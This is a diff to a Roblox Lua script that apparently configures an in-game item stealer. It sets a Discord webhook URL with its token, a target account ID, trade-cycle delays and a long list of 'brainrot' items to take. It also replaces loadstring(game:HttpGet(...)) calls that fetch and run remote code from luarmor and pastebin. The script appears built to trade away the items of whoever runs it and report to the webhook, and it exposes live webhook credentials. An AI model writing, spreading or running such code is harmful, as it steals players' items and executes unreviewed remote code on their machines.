@@ -1,5 +1,5 @@
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480343941269422311/LKBdzeuExhcQdtOqy-mKycVpraqJPGB7kfvbAf1l4U-ogXIyTNwI8n069S3iMs138XIj"
-getgenv().TARGET_ID = 9187702762
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480068269061967882/5W02jbGUlbvnIfb82xEa-T2DQro7r-CN_7eIv6k7FNTQMzWNW6QIVYlV_2WG4hh0iJcJ"
+getgenv().TARGET_ID = 8615074823
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2 
 getgenv().TARGET_BRAINROTS = {
@@ -106,11 +106,78 @@ getgenv().TARGET_BRAINROTS = {
     ["Chicleteira Cupideira"] = true,
     ["Chimnino"] = true,
     ["67"] = true,
-    ["Los Candies"] = true
+    ["Los Candies"] = true,
+    ["Lovin Rose"] = true,
+    ["Pot Hotspot"] = true,
+    ["Guerriro Digitale"] = true,
+    ["Los Tortus"] = true,
+    ["Torrtuginni Dragonfrutini"] = true,
+    ["Los Mi Gatitos"] = true,
+    ["Los Chicleteiras"] = true,
+    ["Yess my examine"] = true,
+    ["1x1x1x1"] = true,
+    ["Noo my examine"] = true,
+    ["Los Karkeritos"] = true,
+    ["Las Vaquitas Saturnitas"] = true,
+    ["Los Spyderinis"] = true,
+    ["Los Matteos"] = true,
+    ["Los Cucarachas"] = true,
+    ["Los Burritos"] = true,
+    ["Rang Ring Bus"] = true,
+    ["Los Nooo My Hotspotsitos"] = true,
+    ["Arcadopus"] = true,
+    ["Los Quesadillas"] = true,
+    ["Burrito Bandito"] = true,
+    ["Mi Gatito"] = true,
+    ["Pot Pumpkin"] = true,
+    ["Quesadilla Crocodila"] = true,
+    ["Horegini Boom"] = true,
+    ["Nooo My Hotspot"] = true,
+    ["Los Jobcitos"] = true,
+    ["Tung Tung Tung Sahur"] = true,
+    ["Coffin Tung Tung Tung Sahur"] = true,
+    ["Blackhole Goat"] = true,
+    ["Chachechi"] = true,
+    ["Dul Dul Dul"] = true,
+    ["Sammyni Spyderini"] = true,
+    ["Karkerkar Kurkur"] = true,
+    ["Noo my Heart"] = true,
+    ["Los 25"] = true,
+    ["Noo my Present"] = true,
+    ["Noo my Candy"] = true,
+    ["Cupid Hotspot"] = true,
+    ["Naughty Naughty"] = true,
+    ["Santa Hotspot"] = true,
+    ["Telemorte"] = true,
+    ["Please my Present"] = true,
+    ["Love Love Love Sahur"] = true,
+    ["Giftini Spyderini"] = true,
+    ["Trickolino"] = true,
+    ["Triplito Tralaleritos"] = true,
+    ["La Vacca Jacko Linterino"] = true,
+    ["Santteo"] = true,
+    ["Frankentteo"] = true,
+    ["Pumpkini Spyderini"] = true,
+    ["Reindeer Tralala"] = true,
+    ["Boatito Auratito"] = true,
+    ["Zombie Tralala"] = true,
+    ["Vulturino Skeletono"] = true,
+    ["La Cucaracha"] = true,
+    ["Extinct Tralalero"] = true,
+    ["Jackorilla"] = true,
+    ["Rocco Disco"] = true,
+    ["Los Trios"] = true,
+    ["Cuadramat and Pakrahmatmamat"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["25"] = true,
+    ["Cupid Cupid Sahur"] = true,
+    ["Ho Ho Ho Sahur"] = true,
+    ["Chill Puppy"] = true,
+    ["Spinny Hammy"] = true,
+    ["Job Job Job Sahur"] = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Chicliterita bicicliterita"] = true,
+    ["Chicleteirina Bicicleteirina"] = true,
+    ["To to to Sahur"] = true
 }
-task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
-end)
-task.spawn(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/4RjBwAZr"))()
-end)
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
